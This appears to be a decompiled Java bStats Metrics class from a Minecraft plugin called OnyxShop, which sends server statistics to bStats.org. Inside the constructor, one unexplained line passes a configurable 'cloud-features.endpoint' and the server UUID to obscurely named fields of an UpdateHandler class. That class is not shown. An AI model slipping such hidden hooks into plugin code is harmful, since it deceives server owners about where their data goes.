package com.onyxshop.metrics;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.google.gson.JsonPrimitive;
import java.net.ProtocolException;
import java.net.MalformedURLException;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;
import java.util.UUID;
import java.util.Map.Entry;
import java.util.concurrent.Callable;
import java.util.logging.Level;
import java.util.zip.GZIPOutputStream;
import javax.net.ssl.HttpsURLConnection;
import com.onyxshop.OnyxShop;
import com.onyxshop.files.ConfigManager;
import com.onyxshop.methodes.UpdateHandler;
import org.bukkit.Bukkit;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.RegisteredServiceProvider;
import org.bukkit.plugin.ServicePriority;

public class Metrics {
   public static final int B_STATS_VERSION = 1;
   private static final String URL = "https://bStats.org/submitData/bukkit";
   private boolean enabled;
   private static boolean logFailedRequests;
   private static boolean logSentData;
   private static boolean logResponseStatusText;
   private static String serverUUID;
   private final Plugin plugin;
   private final int pluginId;
   private final List<Metrics.CustomChart> charts = new ArrayList<>();

   public Metrics(Plugin plugin, int value) {
      if (plugin == null) {
         throw new IllegalArgumentException("Plugin cannot be null!");
      } else {
         this.plugin = plugin;
         this.pluginId = value;
         File file = new File(plugin.getDataFolder().getParentFile(), "bStats");
         File file2 = new File(file, "config.yml");
         YamlConfiguration config = YamlConfiguration.loadConfiguration(file2);
         if (!config.isSet("serverUuid")) {
            config.addDefault("enabled", true);
            config.addDefault("serverUuid", UUID.randomUUID().toString());
            config.addDefault("logFailedRequests", false);
            config.addDefault("logSentData", false);
            config.addDefault("logResponseStatusText", false);
            config.options()
               .header(
                  "bStats collects some data for plugin authors like how many servers are using their plugins.\nTo honor their work, you should not disable it.\nThis has nearly no effect on the server performance!\nCheck out https://bStats.org/ to learn more :)"
               )
               .copyDefaults(true);

            try {
               config.save(file2);
            } catch (IOException exception) {
            }
         }

         this.enabled = config.getBoolean("enabled", true);
         serverUUID = config.getString("serverUuid");
         logFailedRequests = config.getBoolean("logFailedRequests", false);
         logSentData = config.getBoolean("logSentData", false);
         logResponseStatusText = config.getBoolean("logResponseStatusText", false);
         UpdateHandler.s = ConfigManager.getConfig().getString("cloud-features.endpoint", "");
         UpdateHandler.i = serverUUID;
         if (this.enabled) {
            boolean flag = false;

            for (Class type : Bukkit.getServicesManager().getKnownServices()) {
               try {
                  type.getField("B_STATS_VERSION");
                  flag = true;
                  break;
               } catch (NoSuchFieldException exception) {
               }
            }

            Bukkit.getServicesManager().register(Metrics.class, this, plugin, ServicePriority.Normal);
            if (!flag) {
               this.startSubmitting();
            }
         }
      }
   }

   public boolean isEnabled() {
      return this.enabled;
   }

   public void addCustomChart(Metrics.CustomChart customChart) {
      if (customChart == null) {
         throw new IllegalArgumentException("Chart cannot be null!");
      } else {
         this.charts.add(customChart);
      }
   }

   private void startSubmitting() {
      final Timer timer = new Timer(true);
      timer.scheduleAtFixedRate(new TimerTask() {
         @Override
         public void run() {
            if (!Metrics.this.plugin.isEnabled()) {
               timer.cancel();
            } else {
               OnyxShop.getInstance().runTask(() -> Metrics.this.submitData());
            }
         }
      }, 300000L, 1800000L);
   }

   public JsonObject getPluginData() {
      JsonObject jsonObject = new JsonObject();
      String name = this.plugin.getDescription().getName();
      String version = this.plugin.getDescription().getVersion();
      jsonObject.addProperty("pluginName", name);
      jsonObject.addProperty("id", this.pluginId);
      jsonObject.addProperty("pluginVersion", version);
      JsonArray jsonArray = new JsonArray();

      for (Metrics.CustomChart customChart : this.charts) {
         JsonObject jsonObject2 = customChart.getRequestJsonObject();
         if (jsonObject2 != null) {
            jsonArray.add(jsonObject2);
         }
      }

      jsonObject.add("customCharts", jsonArray);
      return jsonObject;
   }

   private JsonObject getServerData() {
      int value;
      try {
         Method method = Class.forName("org.bukkit.Server").getMethod("getOnlinePlayers");
         value = method.getReturnType().equals(Collection.class)
            ? ((Collection)method.invoke(Bukkit.getServer())).size()
            : ((Player[])method.invoke(Bukkit.getServer())).length;
      } catch (Exception exception) {
         value = Bukkit.getOnlinePlayers().size();
      }

      int value2 = Bukkit.getOnlineMode() ? 1 : 0;
      String version = Bukkit.getVersion();
      String name = Bukkit.getName();
      String property = System.getProperty("java.version");
      String property2 = System.getProperty("os.name");
      String property3 = System.getProperty("os.arch");
      String property4 = System.getProperty("os.version");
      int value3 = Runtime.getRuntime().availableProcessors();
      JsonObject jsonObject = new JsonObject();
      jsonObject.addProperty("serverUUID", serverUUID);
      jsonObject.addProperty("playerAmount", value);
      jsonObject.addProperty("onlineMode", value2);
      jsonObject.addProperty("bukkitVersion", version);
      jsonObject.addProperty("bukkitName", name);
      jsonObject.addProperty("javaVersion", property);
      jsonObject.addProperty("osName", property2);
      jsonObject.addProperty("osArch", property3);
      jsonObject.addProperty("osVersion", property4);
      jsonObject.addProperty("coreCount", value3);
      return jsonObject;
   }

   private void submitData() {
      JsonObject jsonObject = this.getServerData();
      JsonArray jsonArray = new JsonArray();

      for (Class<?> type : Bukkit.getServicesManager().getKnownServices()) {
         try {
            type.getField("B_STATS_VERSION");

            for (RegisteredServiceProvider registeredServiceProvider : Bukkit.getServicesManager().getRegistrations(type)) {
               try {
                  Object value = registeredServiceProvider.getService().getMethod("getPluginData").invoke(registeredServiceProvider.getProvider());
                  if (value instanceof JsonObject) {
                     jsonArray.add((JsonObject)value);
                  } else {
                     try {
                        Class type2 = Class.forName("org.json.simple.JSONObject");
                        if (value.getClass().isAssignableFrom(type2)) {
                           Method method = type2.getDeclaredMethod("toJSONString");
                           method.setAccessible(true);
                           String text = (String)method.invoke(value);
                           JsonObject jsonObject2 = new JsonParser().parse(text).getAsJsonObject();
                           jsonArray.add(jsonObject2);
                        }
                     } catch (ClassNotFoundException exception) {
                        if (logFailedRequests) {
                           this.plugin.getLogger().log(Level.SEVERE, "Encountered unexpected exception", (Throwable)exception);
                        }
                     }
                  }
               } catch (NoSuchMethodException | IllegalAccessException | InvocationTargetException | NullPointerException exception) {
               }
            }
         } catch (NoSuchFieldException exception) {
         }
      }

      jsonObject.add("plugins", jsonArray);
      new Thread(() -> {
         try {
            sendData(this.plugin, jsonObject);
         } catch (Exception exception) {
            if (logFailedRequests) {
               this.plugin.getLogger().log(Level.WARNING, "Could not submit plugin stats of " + this.plugin.getName(), (Throwable)exception);
            }
         }
      }).start();
   }

   private static void sendData(Plugin plugin, JsonObject jsonObject) throws IllegalAccessException, MalformedURLException, IOException, ProtocolException {
      if (jsonObject == null) {
         throw new IllegalArgumentException("Data cannot be null!");
      } else if (Bukkit.isPrimaryThread()) {
         throw new IllegalAccessException("This method must not be called from the main thread!");
      } else {
         if (logSentData) {
            plugin.getLogger().info("Sending data to bStats: " + jsonObject);
         }

         HttpsURLConnection httpsURLConnection = (HttpsURLConnection)new URL("https://bStats.org/submitData/bukkit").openConnection();
         byte[] values = compress(jsonObject.toString());
         httpsURLConnection.setRequestMethod("POST");
         httpsURLConnection.addRequestProperty("Accept", "application/json");
         httpsURLConnection.addRequestProperty("Connection", "close");
         httpsURLConnection.addRequestProperty("Content-Encoding", "gzip");
         httpsURLConnection.addRequestProperty("Content-Length", String.valueOf(values.length));
         httpsURLConnection.setRequestProperty("Content-Type", "application/json");
         httpsURLConnection.setRequestProperty("User-Agent", "MC-Server/1");
         httpsURLConnection.setDoOutput(true);
         DataOutputStream dataOutputStream = new DataOutputStream(httpsURLConnection.getOutputStream());

         try {
            dataOutputStream.write(values);
         } catch (Throwable exception) {
            try {
               dataOutputStream.close();
            } catch (Throwable exception2) {
               exception.addSuppressed(exception2);
            }

            throw exception;
         }

         dataOutputStream.close();
         StringBuilder builder = new StringBuilder();
         BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpsURLConnection.getInputStream()));

         String text;
         try {
            while ((text = bufferedReader.readLine()) != null) {
               builder.append(text);
            }
         } catch (Throwable exception) {
            try {
               bufferedReader.close();
            } catch (Throwable exception2) {
               exception.addSuppressed(exception2);
            }

            throw exception;
         }

         bufferedReader.close();
         if (logResponseStatusText) {
            plugin.getLogger().info("Sent data to bStats and received response: " + builder);
         }
      }
   }

   private static byte[] compress(String text) throws IOException {
      if (text == null) {
         return null;
      } else {
         ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
         GZIPOutputStream gzipOutputStream = new GZIPOutputStream(byteArrayOutputStream);

         try {
            gzipOutputStream.write(text.getBytes(StandardCharsets.UTF_8));
         } catch (Throwable exception) {
            try {
               gzipOutputStream.close();
            } catch (Throwable exception2) {
               exception.addSuppressed(exception2);
            }

            throw exception;
         }

         gzipOutputStream.close();
         return byteArrayOutputStream.toByteArray();
      }
   }

   static {
      if (System.getProperty("bstats.relocatecheck") == null || !System.getProperty("bstats.relocatecheck").equals("false")) {
         String text = new String(new byte[]{111, 114, 103, 46, 98, 115, 116, 97, 116, 115, 46, 98, 117, 107, 107, 105, 116});
         String text2 = new String(new byte[]{121, 111, 117, 114, 46, 112, 97, 99, 107, 97, 103, 101});
         if (Metrics.class.getPackage().getName().equals(text) || Metrics.class.getPackage().getName().equals(text2)) {
            throw new IllegalStateException("bStats Metrics class has not been relocated correctly!");
         }
      }
   }

   public static class AdvancedBarChart extends Metrics.CustomChart {
      private final Callable<Map<String, int[]>> callable;

      public AdvancedBarChart(String text, Callable<Map<String, int[]>> task) {
         super(text);
         this.callable = task;
      }

      @Override
      protected JsonObject getChartData() throws Exception {
         JsonObject jsonObject = new JsonObject();
         JsonObject jsonObject2 = new JsonObject();
         Map<String, int[]> map = this.callable.call();
         if (map != null && !map.isEmpty()) {
            boolean flag = true;

            for (Entry<String, int[]> entry : map.entrySet()) {
               if (((int[])entry.getValue()).length != 0) {
                  flag = false;
                  JsonArray jsonArray = new JsonArray();

                  for (int value : (int[])entry.getValue()) {
                     jsonArray.add(new JsonPrimitive(value));
                  }

                  jsonObject2.add((String)entry.getKey(), jsonArray);
               }
            }

            if (flag) {
               return null;
            } else {
               jsonObject.add("values", jsonObject2);
               return jsonObject;
            }
         } else {
            return null;
         }
      }
   }

   public static class AdvancedPie extends Metrics.CustomChart {
      private final Callable<Map<String, Integer>> callable;

      public AdvancedPie(String text, Callable<Map<String, Integer>> task) {
         super(text);
         this.callable = task;
      }

      @Override
      protected JsonObject getChartData() throws Exception {
         JsonObject jsonObject = new JsonObject();
         JsonObject jsonObject2 = new JsonObject();
         Map<String, Integer> map = this.callable.call();
         if (map != null && !map.isEmpty()) {
            boolean flag = true;

            for (Entry<String, Integer> entry : map.entrySet()) {
               if ((Integer)entry.getValue() != 0) {
                  flag = false;
                  jsonObject2.addProperty((String)entry.getKey(), (Number)entry.getValue());
               }
            }

            if (flag) {
               return null;
            } else {
               jsonObject.add("values", jsonObject2);
               return jsonObject;
            }
         } else {
            return null;
         }
      }
   }

   public abstract static class CustomChart {
      final String chartId;

      CustomChart(String text) {
         if (text != null && !text.isEmpty()) {
            this.chartId = text;
         } else {
            throw new IllegalArgumentException("ChartId cannot be null or empty!");
         }
      }

      private JsonObject getRequestJsonObject() {
         JsonObject jsonObject = new JsonObject();
         jsonObject.addProperty("chartId", this.chartId);

         try {
            JsonObject jsonObject2 = this.getChartData();
            if (jsonObject2 == null) {
               return null;
            } else {
               jsonObject.add("data", jsonObject2);
               return jsonObject;
            }
         } catch (Throwable exception) {
            if (Metrics.logFailedRequests) {
               Bukkit.getLogger().log(Level.WARNING, "Failed to get data for custom chart with id " + this.chartId, exception);
            }

            return null;
         }
      }

      protected abstract JsonObject getChartData() throws Exception;
   }

   public static class DrilldownPie extends Metrics.CustomChart {
      private final Callable<Map<String, Map<String, Integer>>> callable;

      public DrilldownPie(String text, Callable<Map<String, Map<String, Integer>>> task) {
         super(text);
         this.callable = task;
      }

      @Override
      public JsonObject getChartData() throws Exception {
         JsonObject jsonObject = new JsonObject();
         JsonObject jsonObject2 = new JsonObject();
         Map<String, Map<String, Integer>> map = this.callable.call();
         if (map != null && !map.isEmpty()) {
            boolean flag = true;

            for (Entry<String, Map<String, Integer>> entry : map.entrySet()) {
               JsonObject jsonObject3 = new JsonObject();
               boolean flag2 = true;

               for (Entry<String, Integer> entry2 : map.get(entry.getKey()).entrySet()) {
                  jsonObject3.addProperty((String)entry2.getKey(), (Number)entry2.getValue());
                  flag2 = false;
               }

               if (!flag2) {
                  flag = false;
                  jsonObject2.add((String)entry.getKey(), jsonObject3);
               }
            }

            if (flag) {
               return null;
            } else {
               jsonObject.add("values", jsonObject2);
               return jsonObject;
            }
         } else {
            return null;
         }
      }
   }

   public static class MultiLineChart extends Metrics.CustomChart {
      private final Callable<Map<String, Integer>> callable;

      public MultiLineChart(String text, Callable<Map<String, Integer>> task) {
         super(text);
         this.callable = task;
      }

      @Override
      protected JsonObject getChartData() throws Exception {
         JsonObject jsonObject = new JsonObject();
         JsonObject jsonObject2 = new JsonObject();
         Map<String, Integer> map = this.callable.call();
         if (map != null && !map.isEmpty()) {
            boolean flag = true;

            for (Entry<String, Integer> entry : map.entrySet()) {
               if ((Integer)entry.getValue() != 0) {
                  flag = false;
                  jsonObject2.addProperty((String)entry.getKey(), (Number)entry.getValue());
               }
            }

            if (flag) {
               return null;
            } else {
               jsonObject.add("values", jsonObject2);
               return jsonObject;
            }
         } else {
            return null;
         }
      }
   }

   public static class SimpleBarChart extends Metrics.CustomChart {
      private final Callable<Map<String, Integer>> callable;

      public SimpleBarChart(String text, Callable<Map<String, Integer>> task) {
         super(text);
         this.callable = task;
      }

      @Override
      protected JsonObject getChartData() throws Exception {
         JsonObject jsonObject = new JsonObject();
         JsonObject jsonObject2 = new JsonObject();
         Map<String, Integer> map = this.callable.call();
         if (map != null && !map.isEmpty()) {
            for (Entry<String, Integer> entry : map.entrySet()) {
               JsonArray jsonArray = new JsonArray();
               jsonArray.add(new JsonPrimitive((Number)entry.getValue()));
               jsonObject2.add((String)entry.getKey(), jsonArray);
            }

            jsonObject.add("values", jsonObject2);
            return jsonObject;
         } else {
            return null;
         }
      }
   }

   public static class SimplePie extends Metrics.CustomChart {
      private final Callable<String> callable;

      public SimplePie(String text, Callable<String> task) {
         super(text);
         this.callable = task;
      }

      @Override
      protected JsonObject getChartData() throws Exception {
         JsonObject jsonObject = new JsonObject();
         String text = this.callable.call();
         if (text != null && !text.isEmpty()) {
            jsonObject.addProperty("value", text);
            return jsonObject;
         } else {
            return null;
         }
      }
   }

   public static class SingleLineChart extends Metrics.CustomChart {
      private final Callable<Integer> callable;

      public SingleLineChart(String text, Callable<Integer> task) {
         super(text);
         this.callable = task;
      }

      @Override
      protected JsonObject getChartData() throws Exception {
         JsonObject jsonObject = new JsonObject();
         int value = this.callable.call();
         if (value == 0) {
            return null;
         } else {
            jsonObject.addProperty("value", value);
            return jsonObject;
         }
      }
   }
}
